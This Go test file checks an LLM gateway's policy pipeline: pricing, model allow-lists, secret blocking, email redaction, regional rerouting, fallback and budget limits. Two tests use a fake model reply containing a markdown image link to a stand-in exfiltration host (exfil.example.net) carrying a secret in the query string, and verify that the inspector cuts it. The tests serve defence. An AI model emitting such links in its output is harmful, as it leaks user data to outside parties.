package gateway

import (
	"context"
	"math/rand/v2"
	"strings"
	"testing"
	"time"

	"github.com/jbouder/stargate/server/internal/demo"
	"github.com/jbouder/stargate/server/internal/fakellm"
	"github.com/jbouder/stargate/server/internal/model"
	"github.com/jbouder/stargate/server/internal/traffic"
)

func secret(id string) string {
	for _, k := range demo.Keys {
		if k.ID == id {
			return "Bearer " + demo.DevSecret(k.Prefix)
		}
	}
	panic(id)
}

func chat(m, user string) fakellm.ChatRequest {
	return fakellm.ChatRequest{Model: m, MaxTokens: 200, Messages: []fakellm.Message{{Role: "user", Content: user}}}
}

// fixedUp answers from a script of statuses, one per call, then 200s.
type fixedUp struct {
	statuses []int
	content  string
	calls    []string
}

func (f *fixedUp) Call(_ context.Context, backend string, req fakellm.ChatRequest, onDelta func(string) bool) Result {
	f.calls = append(f.calls, backend+"/"+req.Model)
	st := 200
	if len(f.statuses) > 0 {
		st, f.statuses = f.statuses[0], f.statuses[1:]
	}
	if st != 200 {
		return Result{Status: st, ErrMsg: "overloaded", Duration: 10 * time.Millisecond}
	}
	u := &fakellm.Usage{PromptTokens: 1000, CompletionTokens: 500}
	return Result{Status: 200, Content: f.content, Usage: u, Duration: 300 * time.Millisecond}
}

func run(t *testing.T, s *Snapshot, in Input, up Upstream) *model.Receipt {
	t.Helper()
	in.Now = time.Now()
	d := Admit(s, in, rand.New(rand.NewPCG(1, 2)))
	if d.Reject != nil {
		return d.Finish(s, nil, Result{}, nil, time.Now())
	}
	c, res, failed := Execute(context.Background(), d, up, nil)
	return d.Finish(s, c, res, failed, time.Now())
}

func TestAllowedRequestCostsFromPricing(t *testing.T) {
	rc := run(t, DemoSnapshot(), Input{Secret: secret("k1"), Req: chat("gpt-5-mini", "hello")}, &fixedUp{content: "hi"})
	if rc.Verdict != "allowed" || rc.Backend != "openai-prod" || rc.Status != 200 {
		t.Fatalf("got %s via %s status %d", rc.Verdict, rc.Backend, rc.Status)
	}
	// 1000 in × $0.25/M + 500 out × $2/M
	if want := 0.00125; rc.CostUSD < want-1e-9 || rc.CostUSD > want+1e-9 {
		t.Fatalf("cost %v, want %v", rc.CostUSD, want)
	}
	if len(rc.Trace) != 6 {
		t.Fatalf("trace has %d steps", len(rc.Trace))
	}
}

func TestUnknownKeyHasNoReceipt(t *testing.T) {
	d := Admit(DemoSnapshot(), Input{Secret: "Bearer nope", Req: chat("gpt-5-mini", "x"), Now: time.Now()}, rand.New(rand.NewPCG(1, 2)))
	if d.Reject == nil || d.Reject.Status != 401 || d.Receipt != nil {
		t.Fatalf("want 401 with no receipt, got %+v", d.Reject)
	}
}

func TestModelNotAllowedIsBlocked(t *testing.T) {
	rc := run(t, DemoSnapshot(), Input{Secret: secret("k1"), Req: chat("claude-opus-4-1", "x")}, &fixedUp{})
	if rc.Verdict != "blocked" || rc.ErrorCode != "model_not_allowed" || rc.Status != 403 {
		t.Fatalf("got %s %s %d", rc.Verdict, rc.ErrorCode, rc.Status)
	}
}

func TestSecretBlockedByRule(t *testing.T) {
	up := &fixedUp{}
	rc := run(t, DemoSnapshot(), Input{Secret: secret("k2"), Req: chat("claude-sonnet-5", "key sk-abcdefghijklmnopqrstuvwxyz")}, up)
	if rc.Verdict != "blocked" || rc.ErrorCode != "policy_blocked" || len(up.calls) != 0 {
		t.Fatalf("got %s %s, upstream calls %v", rc.Verdict, rc.ErrorCode, up.calls)
	}
	if last := rc.Rules[len(rc.Rules)-1]; last.RuleID != "r3" || !last.Matched {
		t.Fatalf("last rule eval %+v", last)
	}
}

func TestEmailRedactedBeforeUpstream(t *testing.T) {
	s := DemoSnapshot()
	d := Admit(s, Input{Secret: secret("k1"), Req: chat("gpt-5-mini", "mail a@b.com and c@d.org"), Now: time.Now()}, rand.New(rand.NewPCG(1, 2)))
	if got := d.Req.Messages[0].Content; strings.Contains(got, "@") || !strings.Contains(got, "[EMAIL_2]") {
		t.Fatalf("prompt not redacted: %q", got)
	}
	c, res, failed := Execute(context.Background(), d, &fixedUp{}, nil)
	rc := d.Finish(s, c, res, failed, time.Now())
	if rc.Verdict != "redacted" || rc.Redactions[0] != (model.Redaction{Type: "email", Count: 2}) {
		t.Fatalf("got %s %+v", rc.Verdict, rc.Redactions)
	}
}

func TestSecurityTeamIsNotRedacted(t *testing.T) {
	rc := run(t, DemoSnapshot(), Input{Secret: secret("k6"), Req: chat("llama-3.3-70b", "a@b.com")}, &fixedUp{})
	if rc.Verdict != "allowed" {
		t.Fatalf("got %s", rc.Verdict)
	}
}

func TestEURegionReroutesToPrivate(t *testing.T) {
	rc := run(t, DemoSnapshot(), Input{Secret: secret("k1"), Region: "eu", Req: chat("claude-sonnet-5", "hi")}, &fixedUp{})
	if rc.Verdict != "rerouted" || rc.Backend != "vllm-internal" || rc.ResolvedModel != "llama-3.3-70b" || rc.RouteReason != "policy" {
		t.Fatalf("got %s via %s/%s (%s)", rc.Verdict, rc.Backend, rc.ResolvedModel, rc.RouteReason)
	}
	if !rc.ContentCaptured {
		t.Fatal("vllm-internal captures content")
	}
}

func TestAliasResolves(t *testing.T) {
	rc := run(t, DemoSnapshot(), Input{Secret: secret("k3"), Req: chat("summarize-digest", "hi")}, &fixedUp{})
	if rc.ResolvedModel != "gpt-5-mini" || rc.RouteReason != "alias" || rc.RequestedModel != "summarize-digest" {
		t.Fatalf("got %s (%s)", rc.ResolvedModel, rc.RouteReason)
	}
}

func TestOverloadFallsBack(t *testing.T) {
	up := &fixedUp{statuses: []int{529}}
	rc := run(t, DemoSnapshot(), Input{Secret: secret("k2"), Req: chat("claude-sonnet-5", "hi")}, up)
	if rc.Backend != "bedrock-eu" || rc.FallbackFrom == "" || rc.RouteReason != "fallback" || rc.Status != 200 {
		t.Fatalf("got %s from %q (%s) status %d; calls %v", rc.Backend, rc.FallbackFrom, rc.RouteReason, rc.Status, up.calls)
	}
}

func TestOpusFallbackSubstitutesSameFamily(t *testing.T) {
	up := &fixedUp{statuses: []int{529}}
	rc := run(t, DemoSnapshot(), Input{Secret: secret("k2"), Req: chat("claude-opus-4-1", "hi")}, up)
	if rc.Backend != "bedrock-eu" || rc.ResolvedModel != "claude-sonnet-5" {
		t.Fatalf("got %s/%s; calls %v", rc.Backend, rc.ResolvedModel, up.calls)
	}
}

func TestRateLimitIsNotRetried(t *testing.T) {
	up := &fixedUp{statuses: []int{429}}
	rc := run(t, DemoSnapshot(), Input{Secret: secret("k2"), Req: chat("claude-sonnet-5", "hi")}, up)
	if rc.Status != 429 || rc.ErrorCode != "upstream_rate_limited" || len(up.calls) != 1 || rc.CostUSD != 0 {
		t.Fatalf("got %d %s cost %v; calls %v", rc.Status, rc.ErrorCode, rc.CostUSD, up.calls)
	}
}

func TestBudgetBlock(t *testing.T) {
	s := DemoSnapshot()
	s.Spend.ByTeam["agents"] = 40_001
	rc := run(t, s, Input{Secret: secret("k2"), Req: chat("claude-sonnet-5", "hi")}, &fixedUp{})
	if rc.Verdict != "blocked" || rc.ErrorCode != "budget_exceeded" {
		t.Fatalf("got %s %s", rc.Verdict, rc.ErrorCode)
	}
	s.Spend.ByTeam["support"] = 99_999 // throttle: admitted with a warning
	rc = run(t, s, Input{Secret: secret("k1"), Req: chat("gpt-5-mini", "hi")}, &fixedUp{})
	if rc.Verdict != "allowed" || rc.Trace[1].State != "warn" {
		t.Fatalf("throttle: got %s, budget step %+v", rc.Verdict, rc.Trace[1])
	}
}

func TestExfilTruncates(t *testing.T) {
	rc := run(t, DemoSnapshot(), Input{Secret: secret("k1"), Req: chat("gpt-5-mini", "hi")},
		&fixedUp{content: "fine text ![x](https://exfil.example.net/c?d=secret) more"})
	if rc.Verdict != "truncated" || rc.InboundVerdict != "blocked" {
		t.Fatalf("got %s/%s", rc.Verdict, rc.InboundVerdict)
	}
}

func TestInspectorCutsStreamAcrossChunks(t *testing.T) {
	in := &Inspector{}
	var sent strings.Builder
	for _, c := range []string{"hello ![x](https://ex", "fil.example.net/c?d=1)", " after"} {
		keep, ok := in.Feed(c)
		sent.WriteString(keep)
		if !ok {
			break
		}
	}
	if !in.Cut || strings.Contains(in.Content(), "d=1") {
		t.Fatalf("cut=%v content=%q", in.Cut, in.Content())
	}
}

// The generated mix should land near the mockup's verdict shares.
func TestGeneratedMixProducesEveryVerdict(t *testing.T) {
	s := DemoSnapshot()
	r := rand.New(rand.NewPCG(7, 8))
	gen := traffic.New()
	up := &SimUpstream{Rand: r}
	counts := map[string]int{}
	const n = 5000
	for i := 0; i < n; i++ {
		req := gen.Next(r)
		d := Admit(s, Input{Secret: req.Secret, Region: req.Region, Req: req.Body, Now: time.Now()}, r)
		var rc *model.Receipt
		if d.Reject != nil {
			rc = d.Finish(s, nil, Result{}, nil, time.Now())
		} else {
			c, res, failed := Execute(context.Background(), d, up, func(string) bool { return true })
			rc = d.Finish(s, c, res, failed, time.Now())
		}
		counts[rc.Verdict]++
	}
	for _, v := range []string{"allowed", "redacted", "rerouted", "blocked", "truncated"} {
		if counts[v] == 0 {
			t.Errorf("no %s receipts in %d: %v", v, n, counts)
		}
	}
	if share := float64(counts["allowed"]) / n; share < 0.7 || share > 0.9 {
		t.Errorf("allowed share %.2f outside 0.7–0.9: %v", share, counts)
	}
	t.Logf("verdicts: %v", counts)
}
